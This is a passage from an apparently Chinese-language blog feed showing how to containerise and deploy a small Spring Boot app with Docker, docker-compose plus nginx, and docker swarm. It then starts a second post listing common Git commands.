<h2 id="8-6-部署SpringBoot项目"><a href="#8-6-部署SpringBoot项目" class="headerlink" title="8.6 部署SpringBoot项目"></a>8.6 部署SpringBoot项目</h2><h3 id="8-6-1-docker-run"><a href="#8-6-1-docker-run" class="headerlink" title="8.6.1 docker run"></a>8.6.1 docker run</h3><h4 id="1）项目源码"><a href="#1）项目源码" class="headerlink" title="1）项目源码"></a>1）项目源码</h4><p>项目名：docker-test</p>
<ul>
<li>pom.xml</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.zhifei<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>docker-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>$&#123;project.artifactId&#125;<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Application.java</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhifei.docker;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.env.Environment;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Application</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> He Zhifei</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2022/4/12 14:57</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RestController</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">InfoController</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(InfoController.class);</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Autowired</span></span><br><span class="line">        <span class="keyword">private</span> Environment env;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@GetMapping(&quot;/info&quot;)</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">info</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">            <span class="comment">// application.yml中不配置端口时，通过Environment获取。</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;服务器信息 - &quot;</span> + getIp(request) + <span class="string">&quot;:&quot;</span> + env.getProperty(<span class="string">&quot;local.server.port&quot;</span>);</span><br><span class="line">            logger.info(msg);</span><br><span class="line">            <span class="keyword">return</span> msg;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 获取请求ip</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> request 请求</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@return</span> 请求ip</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getIp</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (request == <span class="literal">null</span>) &#123;</span><br><span class="line">                request = getRequest();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (request == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;unknown&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;x-forwarded-for&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (ipIsBlankOrUnknown(ip)) &#123;</span><br><span class="line">                ip = request.getHeader(<span class="string">&quot;Proxy-Client-IP&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (ipIsBlankOrUnknown(ip)) &#123;</span><br><span class="line">                ip = request.getHeader(<span class="string">&quot;X-Forwarded-For&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (ipIsBlankOrUnknown(ip)) &#123;</span><br><span class="line">                ip = request.getHeader(<span class="string">&quot;WL-Proxy-Client-IP&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (ipIsBlankOrUnknown(ip)) &#123;</span><br><span class="line">                ip = request.getHeader(<span class="string">&quot;X-Real-IP&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (ipIsBlankOrUnknown(ip)) &#123;</span><br><span class="line">                ip = request.getRemoteAddr();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;0:0:0:0:0:0:0:1&quot;</span>.equals(ip) ? <span class="string">&quot;127.0.0.1&quot;</span> : ip;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 获取HttpServletRequest</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@return</span> HttpServletRequest</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> HttpServletRequest <span class="title function_">getRequest</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 判断ip是否为空或者&quot;unknown&quot;</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> ip</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">ipIsBlankOrUnknown</span><span class="params">(String ip)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ip == <span class="literal">null</span> || ip.length() == <span class="number">0</span> || <span class="string">&quot;unknown&quot;</span>.equalsIgnoreCase(ip);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>在项目根目录下创建Dockerfile</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FROM openjdk:8</span><br><span class="line">MAINTAINER hezhifei he-zhifei@foxmail.com</span><br><span class="line">WORKDIR /opt</span><br><span class="line">VOLUME /data</span><br><span class="line">ADD target/docker-test.jar app.jar</span><br><span class="line">EXPOSE 8080</span><br><span class="line">ENTRYPOINT [&quot;java&quot;,&quot;-jar&quot;,&quot;app.jar&quot;]</span><br></pre></td></tr></table></figure>

<h4 id="2）构建镜像"><a href="#2）构建镜像" class="headerlink" title="2）构建镜像"></a>2）构建镜像</h4><p>在服务器上拉取代码，进行打包，然后构建镜像。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd docker-test</span><br><span class="line">mvn package</span><br><span class="line">docker build -f Dockerfile -t harbor.loc/library/docker-test:v1.0.0 .</span><br></pre></td></tr></table></figure>

<h4 id="3）运行并测试"><a href="#3）运行并测试" class="headerlink" title="3）运行并测试"></a>3）运行并测试</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -itd -p 11000:8080 --name docker-test harbor.loc/library/docker-test:v1.0.0</span><br><span class="line">curl localhost:11000/info</span><br></pre></td></tr></table></figure>

<h4 id="4）推送镜像到harbor"><a href="#4）推送镜像到harbor" class="headerlink" title="4）推送镜像到harbor"></a>4）推送镜像到harbor</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">登录</span></span><br><span class="line">docker login harbor.loc -u admin -p Harbor12345</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">推送</span></span><br><span class="line">docker push harbor.loc/library/docker-test:v1.0.0</span><br></pre></td></tr></table></figure>

<h3 id="8-6-2-docker-compose（多分片）"><a href="#8-6-2-docker-compose（多分片）" class="headerlink" title="8.6.2 docker compose（多分片）"></a>8.6.2 docker compose（多分片）</h3><h4 id="1）docker-compose-yml"><a href="#1）docker-compose-yml" class="headerlink" title="1）docker-compose.yml"></a>1）docker-compose.yml</h4><p>在项目根目录下创建docker-compose.yml，定义了docker-test、nginx容器的编排，以及容器网络。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3.8&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">docker-test:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">harbor.loc/library/docker-test:v1.0.0</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">docker-test-net</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/opt/data:/data</span></span><br><span class="line">  <span class="attr">nginx:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">docker-test-net</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">12000</span><span class="string">:80</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/opt/docker/nginx/conf.d:/etc/nginx/conf.d</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/opt/docker/nginx/logs:/var/log/nginx</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">docker-test</span></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">docker-test-net:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">bridge</span></span><br></pre></td></tr></table></figure>

<h4 id="2）修改nginx配置"><a href="#2）修改nginx配置" class="headerlink" title="2）修改nginx配置"></a>2）修改nginx配置</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /opt/docker/nginx/conf.d &amp;&amp; cat &lt;&lt;&#x27;EOF&#x27;&gt;/opt/docker/nginx/conf.d/docker-test.conf</span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    listen  [::]:80;</span><br><span class="line">    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    #charset koi8-r;</span><br><span class="line">    #access_log  /var/log/nginx/host.access.log  main;</span><br><span class="line">    </span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://docker-test:8080;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    #error_page  404              /404.html;</span><br><span class="line">    </span><br><span class="line">    # redirect server error pages to the static page /50x.html</span><br><span class="line">    #</span><br><span class="line">    error_page   500 502 503 504  /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    # proxy the PHP scripts to Apache listening on 127.0.0.1:80</span><br><span class="line">    #</span><br><span class="line">    #location ~ \.php$ &#123;</span><br><span class="line">    #    proxy_pass   http://127.0.0.1;</span><br><span class="line">    #&#125;</span><br><span class="line">    </span><br><span class="line">    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class="line">    #</span><br><span class="line">    #location ~ \.php$ &#123;</span><br><span class="line">    #    root           html;</span><br><span class="line">    #    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">    #    fastcgi_index  index.php;</span><br><span class="line">    #    fastcgi_param  SCRIPT_FILENAME  /scripts;</span><br><span class="line">    #    include        fastcgi_params;</span><br><span class="line">    #&#125;</span><br><span class="line">    </span><br><span class="line">    # deny access to .htaccess files, if Apache&#x27;s document root</span><br><span class="line">    # concurs with nginx&#x27;s one</span><br><span class="line">    #</span><br><span class="line">    #location ~ /\.ht &#123;</span><br><span class="line">    #    deny  all;</span><br><span class="line">    #&#125;</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<h4 id="3）运行并测试-1"><a href="#3）运行并测试-1" class="headerlink" title="3）运行并测试"></a>3）运行并测试</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">up启动，down停止；--build启动前docker build；-d后台启动；--scale指定节点数。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker-compose up [--build] [-d] [--scale &lt;服务名称&gt;=&lt;服务节点数&gt;]</span></span><br><span class="line">docker-compose up -d --scale docker-test=3</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker-compose down时，会停止并移除容器，通过这种方式创建的网络也一并移除。</span></span><br><span class="line">[root@harbor docker-test]# docker-compose down</span><br><span class="line">Stopping docker-test_nginx_1       ... done</span><br><span class="line">Stopping docker-test_docker-test_1 ... done</span><br><span class="line">Stopping docker-test_docker-test_2 ... done</span><br><span class="line">Stopping docker-test_docker-test_3 ... done</span><br><span class="line">Removing docker-test_nginx_1       ... done</span><br><span class="line">Removing docker-test_docker-test_1 ... done</span><br><span class="line">Removing docker-test_docker-test_2 ... done</span><br><span class="line">Removing docker-test_docker-test_3 ... done</span><br><span class="line">Removing network docker-test_docker-test-net</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试</span></span><br><span class="line">curl localhost:12000/info</span><br></pre></td></tr></table></figure>

<h3 id="8-6-3-docker-swarm（多节点多分片）"><a href="#8-6-3-docker-swarm（多节点多分片）" class="headerlink" title="8.6.3 docker swarm（多节点多分片）"></a>8.6.3 docker swarm（多节点多分片）</h3><p>前提：</p>
<p>Ⅰ. 按照 [7.1 docker swarm（集群搭建）](# 7.1 docker swarm（集群搭建）) 把5台机器配置成集群，3个管理节点，2个工作节点。</p>
<p>Ⅱ. 所有节点都配置私服的hosts和私服的https证书，这个证书在 [8.1.2 harbor（推荐）](# 8.1.2 harbor（推荐）) 的第3点最后的“重点注意”第2小点有提及到。</p>
<h4 id="1）拉取镜像"><a href="#1）拉取镜像" class="headerlink" title="1）拉取镜像"></a>1）拉取镜像</h4><p>每个节点都拉取私服中的镜像，docker stack deploy拉取的镜像没有tag（tag显示为none），因此需要手动拉取。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull harbor.loc/library/docker-test:v1.0.0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编排二用到nginx镜像</span></span><br><span class="line">docker pull nginx</span><br></pre></td></tr></table></figure>

<h4 id="2）stack-yml"><a href="#2）stack-yml" class="headerlink" title="2）stack.yml"></a>2）stack.yml</h4><p>在任意管理节点上编写stack.yml（数据卷的持久化目录需要提前创建，否则docker stack deploy会提示无此目录）：</p>
<ul>
<li>编排一：不用nginx，创建数据卷目录：mkdir -p &#x2F;opt&#x2F;data</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3.8&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">docker-test:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">harbor.loc/library/docker-test:v1.0.0</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;13000:8080&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/opt/data:/data</span></span><br><span class="line">    <span class="attr">deploy:</span></span><br><span class="line">      <span class="attr">mode:</span> <span class="string">replicated</span></span><br><span class="line">      <span class="attr">replicas:</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>

<ul>
<li>编排二：结合nginx容器编排，创建数据卷目录：mkdir -p &#x2F;opt&#x2F;data &#x2F;opt&#x2F;docker&#x2F;nginx&#x2F;conf.d &#x2F;opt&#x2F;docker&#x2F;nginx&#x2F;logs</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3.8&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">docker-test:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">harbor.loc/library/docker-test:v1.0.0</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">docker-test-net</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/opt/data:/data</span></span><br><span class="line">    <span class="attr">deploy:</span></span><br><span class="line">      <span class="attr">mode:</span> <span class="string">replicated</span></span><br><span class="line">      <span class="attr">replicas:</span> <span class="number">10</span></span><br><span class="line">  <span class="attr">nginx:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">docker-test-net</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">13000</span><span class="string">:80</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/opt/docker/nginx/conf.d:/etc/nginx/conf.d</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/opt/docker/nginx/logs:/var/log/nginx</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">docker-test</span></span><br><span class="line">    <span class="attr">deploy:</span></span><br><span class="line">      <span class="attr">mode:</span> <span class="string">replicated</span></span><br><span class="line">      <span class="attr">replicas:</span> <span class="number">5</span></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">docker-test-net:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">overlay</span></span><br></pre></td></tr></table></figure>

<h4 id="3）开放端口"><a href="#3）开放端口" class="headerlink" title="3）开放端口"></a>3）开放端口</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">firewall-cmd --add-port=13000/tcp --permanent &amp;&amp; firewall-cmd --reload &amp;&amp; firewall-cmd --list-ports</span><br></pre></td></tr></table></figure>

<h4 id="4）运行"><a href="#4）运行" class="headerlink" title="4）运行"></a>4）运行</h4><p>以下集群管理命令需要在管理节点上执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">集群启动或更新，-c指定stack.yml位置，不指定默认当前路径</span></span><br><span class="line">docker stack deploy -c stack.yml docker-test</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出stack</span></span><br><span class="line">docker stack ls</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看指定stack中的services</span></span><br><span class="line">docker stack services &lt;stack名称&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看所有service</span></span><br><span class="line">docker service ls</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看所有节点分片的日志</span></span><br><span class="line">docker service logs &lt;日志id&gt;</span><br><span class="line">[root@localhost ~]# docker service logs --help</span><br><span class="line">Usage:  docker service logs [OPTIONS] SERVICE|TASK</span><br><span class="line">Fetch the logs of a service or task</span><br><span class="line">Options:</span><br><span class="line">      --details        Show extra details provided to logs</span><br><span class="line">  -f, --follow         Follow log output</span><br><span class="line">      --no-resolve     Do not map IDs to Names in output</span><br><span class="line">      --no-task-ids    Do not include task IDs in output</span><br><span class="line">      --no-trunc       Do not truncate output</span><br><span class="line">      --raw            Do not neatly format logs</span><br><span class="line">      --since string   Show logs since timestamp (e.g. 2013-01-02T13:23:37Z) or relative (e.g. 42m for 42 minutes)</span><br><span class="line">  -n, --tail string    Number of lines to show from the end of the logs (default &quot;all&quot;)</span><br><span class="line">  -t, --timestamps     Show timestamps</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看stack启动错误日志</span></span><br><span class="line">docker stack ps &lt;stack名称&gt; --no-trunc</span><br></pre></td></tr></table></figure>

<h4 id="5）测试"><a href="#5）测试" class="headerlink" title="5）测试"></a>5）测试</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可通过swarm集群任意节点访问，要用集群中任一具体IP，不要在服务器上直接用localhost访问。</span></span><br><span class="line">curl &lt;IP&gt;:13000/info</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Git常用命令</title>
    <url>/2019/04/17/Git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="ssh-keygen"><a href="#ssh-keygen" class="headerlink" title="ssh-keygen"></a>ssh-keygen</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 生成ssh-key</span><br><span class="line">ssh-keygen -t rsa -C &quot;youremail@example.com&quot; -b 4096</span><br></pre></td></tr></table></figure>

<h1 id="git-config"><a href="#git-config" class="headerlink" title="git config"></a>git config</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 全局设置用户名</span><br><span class="line">git config --global user.name &quot;用户名&quot;</span><br><span class="line"></span><br><span class="line"># 全局设置邮箱</span><br><span class="line">git config --global user.email &quot;邮箱&quot;</span><br><span class="line"></span><br><span class="line"># 查看git全局信息</span><br><span class="line">git config --list</span><br><span class="line"></span><br><span class="line"># 把xxx操作使用别名yyy来代替</span><br><span class="line">git config --global alias.yyy xxx</span><br></pre></td></tr></table></figure>

<h1 id="git-init"><a href="#git-init" class="headerlink" title="git init"></a>git init</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 初始化本地仓库</span><br><span class="line">git init</span><br></pre></td></tr></table></figure>

<h1 id="git-clone"><a href="#git-clone" class="headerlink" title="git clone"></a>git clone</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 克隆指定地址的仓库到本地</span><br><span class="line">git clone &lt;版本库的网址&gt; &lt;本地目录名&gt;</span><br><span class="line"></span><br><span class="line"># git clone时默认把远程主机名命名为origin，可通过-o参数修改</span><br><span class="line">git clone -o jQuery https://github.com/jquery/jquery.git</span><br></pre></td></tr></table></figure>

<h1 id="git-add"><a href="#git-add" class="headerlink" title="git add"></a>git add</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 工作区 ===&gt; 暂存区，符号.表示当前路径和子路径下所有新增和修改的文件，例如：git add .</span><br><span class="line">git add &lt;file&gt;</span><br></pre></td></tr></table></figure>

<h1 id="git-commit"><a href="#git-commit" class="headerlink" title="git commit"></a>git commit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 暂存区 ===&gt; 本地仓库</span><br><span class="line">git commit -m &quot;描述&quot;</span><br><span class="line"></span><br><span class="line"># 重新提交，最终只有一个提交，可用于修改上一次提交信息，commitId会改变</span><br><span class="line">git commit --amend</span><br></pre></td></tr></table></figure>
<h1 id="git-pull"><a href="#git-pull" class="headerlink" title="git pull"></a>git pull</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 取回远程主机某个分支的更新，再与本地的指定分支合并。</span><br><span class="line">git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;</span><br><span class="line"></span><br><span class="line"># 如果远程分支是与当前分支合并，则冒号后面的部分可以省略。比如git pull origin next，先取回origin/next分支，再与当前分支合并，等同于git fetch再git merge。</span><br><span class="line">git pull &lt;远程主机名&gt; &lt;远程分支名&gt;</span><br><span class="line"></span><br><span class="line"># 如果当前分支与远程分支存在追踪关系，git pull就可以省略远程分支名。本地的当前分支自动与对应的远程主机&quot;追踪分支&quot;（remote-tracking branch）进行合并</span><br><span class="line">git pull &lt;远程主机名&gt;</span><br><span class="line"></span><br><span class="line"># 如果当前分支只有一个追踪分支，远程主机名也可以省略。</span><br><span class="line">git pull</span><br><span class="line"></span><br><span class="line">注：远程主机的分支删除后，再进行pull，不会导致本地分支的删除，如果想删除，可加上-p参数，如：git pull -p</span><br></pre></td></tr></table></figure>


